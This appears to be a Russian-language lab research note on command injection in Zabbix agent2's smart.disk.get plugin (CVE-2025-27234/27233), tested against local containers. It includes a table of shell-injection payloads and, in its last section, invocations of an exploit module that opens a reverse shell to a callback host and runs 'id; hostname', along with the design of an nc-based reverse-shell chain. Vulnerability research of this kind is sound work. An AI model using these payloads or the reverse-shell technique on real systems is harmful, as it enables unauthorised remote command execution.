# Agent2 passive protocol + smart.disk.get vectors (CVE-2025-27233/27234), live-контейнеры

Исследовательская записка по живым контейнерам лаборатории:
- `zlab_agent2_5` — `zabbix/zabbix-agent2:5.0.46-alpine` (хост-порт 10059 → внутр. 10050)
- `zlab_agent2` — `zabbix/zabbix-agent2:7.0.10-alpine` (хост-порт 10050)

Всё проверено на живых контейнерах (протокол-сниффер + прямые запросы) и сверено с исходниками
тегов 5.0.46 / 5.0.47 / 7.0 (git.zabbix.com, shallow clone). `[INFERENCE]` — не подтверждено напрямую.

---

## 1. Пассивный протокол 5.0.46 (НЕ JSON!)

В отличие от 7.0.x (JSON `{"request":"passive checks",...}`), агент 5.0.46 принимает **сырой item key**:

```
C->S: ZBXD\x01 + LE64(len(key)) + key
S->C: ZBXD\x01 + LE32(len(value)) + LE32(len(value)) + value
```

Перехвачено сниффер-прокси (python прокси между `zabbix_get` 5.0.46 и агентом, контейнер
`zlab_agentproxy`, 172.18.0.11:10501 → zlab_agent2_5:10050) для `agent.version`:

```
C->S b'ZBXD\x01\r\x00\x00\x00\x00\x00\x00\x00agent.version'     # header 5+8, payload 13
S->C b'ZBXD\x01\x06\x00\x00\x00\x06\x00\x00\x005.0.46'          # header 5+4+4 (len продублирован)
```

Прямой запрос (host 127.0.0.1:10059), hex `system.hostname`:
```
5a 42 58 44 01 0c 00 00 00 0c 00 00 00 34 32 62 64 62 65 63 39 39 32 66 62
"ZBXD\x01"  LE32(12)  LE32(12)  "42bdbec992fb"
```
Длина ответа дублируется дважды (странность протокола 5.0, LE32×2; парсер читает первое LE32).
Плейн-текстовые ответы: `agent.version` → `5.0.46`, `system.hostname` → `42bdbec992fb`.
Для `smart.disk.get[...]` ответ — JSON-строка (см. §3).

> Замечание: модуль `zbxscan/exploits/modules/agent2.py` реализует только 7.0 JSON-протокол.
> Для 5.0.x нужен raw-канал (этот отчёт фиксирует формат; модуль не менялся — scope «доказательство + отчёт»).

## 2. Модель исполнения smartctl в 5.0.46 (по исходникам тега 5.0.46)

`src/go/plugins/smart/smart.go`:
```go
var cleanRegex = regexp.MustCompile(`^[a-zA-Z0-9 \-_/\\\.]*$`)
// diskGet(): for _, v := range params { clearString(v) }  → ошибка
//   "invalid characters found in parameter '%s'"  (zbxerr)
// diskGetSingle(path, raidType): executable = path; if raidType != "" { executable = path + " -d " + raidType }
```
`src/go/plugins/smart/smart_nix.go`:
```go
executable := fmt.Sprintf("sudo -n %s %s", "smartctl", args)
out, err = zbxcmd.ExecuteStrict(executable, time.Second*...)
```
`src/go/pkg/zbxcmd/zbxcmd_nix.go` (5.0.46):
```go
cmd := exec.Command("sh", "-c", s)   // ← ШЕЛЛ
```

**Вывод по модели**: 5.0.46 выполняет `sh -c "sudo -n smartctl <device> -d <mode>"` — код-путь
**shell-бекед** (RCE-способный), НО параметры проходят строгий whitelist `cleanRegex`
(буквы/цифры/`- _ / \ .`/пробел). Добавлен коммитом `ecf2e8e136` (DEV-2701, 2023-10-27);
входит во все теги 5.0.40…5.0.47 (проверено `git tag --contains`).

## 3. Инъекции в smart.disk.get, живой контейнер 5.0.46 (port 10059)

Клиент: raw-формат из §1. Ответы:

| Запрос | Результат |
|---|---|
| `smart.disk.get[sda,]` | JSON `{"...","error":"Smartctl open device: sda failed: No such device","exit_status":2,...}` — smartctl реально вызван |
| `smart.disk.get[sda,no]` | `"error":"sda: Unknown device type 'no', =======\u003e VALID ARGUMENTS ARE: ata, scsi...` — mode долетает в `-d` |
| `smart.disk.get[sda;id;qq,]` | `ZBX_NOTSUPPORTED\x00Cannot fetch data: Invalid characters found in parameter 'sda;id;qq'.` |
| `smart.disk.get[sda;echo MARKER;,]` | то же (rejected) |
| `smart.disk.get[sda,\`id\`]` | `...Invalid characters found in parameter '\`id\`'.` |
| `smart.disk.get[sda\|id,]`, `sda&x`, `sda$x`, `sda'x`, `sda"x`, `sda(x)`, `sda<x`, `sda#x`, `sda*x`, `sda?x`, `sda!x`, `sda~x`, `sda:x`, `sda@x`, `sda=x`, `sda+x`, `sda%x`, `sda,x` | все REJECTED |
| `smart.disk.get[sda\nid,]` (буквальный LF) | REJECTED |
| `smart.disk.get[aaa bbb,]` (пробел) | OK — `"error":"ERROR: smartctl takes ONE device name as the final command-line argument."` (argv-инъекция, не RCE) |
| `smart.disk.get[-V,]` | `ZBX_NOTSUPPORTED\x00Cannot fetch data: Cannot unmarshal JSON: invalid character 's'...` — **`-V` долетел до smartctl** (в stdout версия `smartctl 7.x...`), т.е. флаг-инъекция в argv работает |
| `smart.disk.get[-o on -d ata,]` | smartctl option-инъекция (argv), ошибка «requires a device name» |

**Итог по 5.0.46**: ни один shell-метасимвол не проходит whitelist; `; id ;`, backticks,
`$(...)`, `|`, `&`, кавычки, LF — все отклоняются на уровне плагина («Invalid characters found in
parameter»). Вывод команды в ответе **не получен** ни в одном варианте. Командная инъекция на
этом бинаре отсутствует; доступна только argv-инъекция в аргументы smartctl (флаги), что не даёт
исполнения произвольных команд (у smartctl нет exec-опций).

## 4. 7.0.10 (port 10050) — срез для сравнения

Протокол: 7.0 JSON (`{"version":"7.0.10","variant":2,...}`), как в модуле agent2.py.

Санитизации в 7.0.x **нет** — параметры приходят verbatim (подтверждено: `smart.disk.get[sda;id;,]`
не отклоняется, `-V`/`-f`/`-l scttempsts` доходят до smartctl: ответ `Cannot marshal JSON: invalid
character 's'...` = smartctl-вывод). Но исполнение — **exec-массив**, без шелла
(`src/go/plugins/smart/controller.go` 7.0):
```go
out, err := exec.CommandContext(ctx, "sudo", "-n", "smartctl", "-a", path, "-d", raidType, "-j").
    CombinedOutput()
```
→ на 7.0.10 примитив строго argv-only; RCE невозможен в принципе (нет `/bin/sh` в цепочке).

## 5. Версии и CVE-2025-27234 (таймлайн исправлений)

- 5.0.0 – 5.0.39: параметры smart.disk.get **без валидации** + исполнение через
  `sh -c "sudo -n smartctl ..."` → **RCE** (CVE-2025-27234, тикет ZBX-26985, «Affected 5.0.0–5.0.46»).
- 5.0.40 – 5.0.46: добавлен `cleanRegex`/`clearString` (DEV-2701, `ecf2e8e136`, 2023-10-27; все
  теги 5.0.40+). Shell остался, но метасимволы блокируются → RCE-флейвор **не воспроизводится**
  (наш живой 5.0.46 попадает сюда). Тикет помечает 5.0.40–5.0.46 «affected» — см. §6.
- 5.0.47: `[ZBX-23858] fixed injection vulnerability in Zabbix agent 2 smartctl plugin` —
  переписан на exec-массив (`controller.go`: `exec.CommandContext(ctx,"sudo","-n",smartctl,args...)`),
  shell убран совсем. Это и есть «Fixed 5.0.47» из тикета.
- 7.0.x: exec-массив с самого начала (7.0 не затрагивается RCE-флейвором; CVE-2025-27233 — argv).

## 6. Итог: вердикт по живому контейнеру 5.0.46

- RCE-флейвор CVE-2025-27234 на контейнере `zlab_agent2_5` (5.0.46) **не воспроизводится**:
  входные параметры проходят `cleanRegex` whitelist; все shell-метасимволы отклоняются
  (`ZBX_NOTSUPPORTED: Invalid characters found in parameter`); вывод `id`/команд в ответе не получен.
- Расхождение с тикетом («Affected 5.0.0–5.0.46»): на теге 5.0.46 (git.zabbix.com, официальный)
  regex уже присутствует, и поведение бинаря это подтверждает. `[INFERENCE]` Формулировка тикета
  покрывает ветку до полного удаления shell (5.0.47); для эксплуатации на 5.0.40–5.0.46 нужен
  обход whitelist-а, которого в ходе проверки не найдено (все метасимволы, включая LF/CR, rejected).
- Шелл-сессия/revshell на 5.0.46: **не получена** (нечем инжектить — argv-only).
- Что подтверждено live: 5.0-пассивный протокол (сырой key, LE32×2 длина), вызов smartctl,
  argv/флаг-инъекция (`-V` долетает), 7.0.10-аргументы verbatim в exec-массив.

Evidence-снимки запросов/ответов — в тексте §1 и §3 (hex и payload), исходники — теги 5.0.46/5.0.47
(local clone `/tmp/zbx50`, `src/go/plugins/smart/{smart.go,smart_nix.go}`, `src/go/pkg/zbxcmd/zbxcmd_nix.go`).

## 7. Модуль RCE-сессии (agent2.py): --cmd/--shell verified (5.0.30)

Live-проверка модуля `zbxscan/exploits/modules/agent2.py` (`Cve202527234._session`) на контейнере
`zlab_agent2_30` (agent2 5.0.30, хост-порт 10061 → внутр. 10050, сеть zbx-testlab, gateway 172.18.0.1):

```
zscan -a -t 127.0.0.1:10061 -exp CVE-2025-27234 --agent-port 10061 \
      --revshell 172.18.0.1:44563 --cmd 'id; hostname'
  → ok: True, mode: cmd
    output: /bin/sh: can't access tty; job control turned off
            /var/lib/zabbix $ uid=1997(zabbix) gid=1995(zabbix) groups=1995(zabbix),0(root)
            c54cae9b6230
```

```
printf 'id\nhostname\nexit\n' | zscan -a -t 127.0.0.1:10061 -exp CVE-2025-27234 \
      --agent-port 10061 --revshell 172.18.0.1:44564 --shell
  → agent# uid=1997(zabbix) ... ; agent# c54cae9b6230 ; exit закрыл REPL (ok: True, mode: shell)
```

Ключевой фикс: fifo+nc-цепочка обёрнута в `(setsid sh -c '...' </dev/null >/dev/null 2>&1 &)`, чтобы
плагинный таймаут «Timeout while executing a shell script» (~3s, kill группы процессов) не убивал
шелл: старый foreground-вариант (`sda;sh -c '...';#`) успевал отдать только баннер (соединение
поднималось, но команды попадали уже в мёртвый `sh` → вывод терялся). `setsid` в контейнере есть
(/usr/bin/setsid); fallback — `nohup`, затем plain-вариант. Приём: poll accept 3×2s на payload,
3 кандидата payload. `--cmd`: `cmd\n` + чтение ~6s; `--shell`: строка → 0.6s → вывод, `exit`
закрывает. Примитив/архитектура подтверждены §1–§3; здесь — воспроизводимость через модуль.
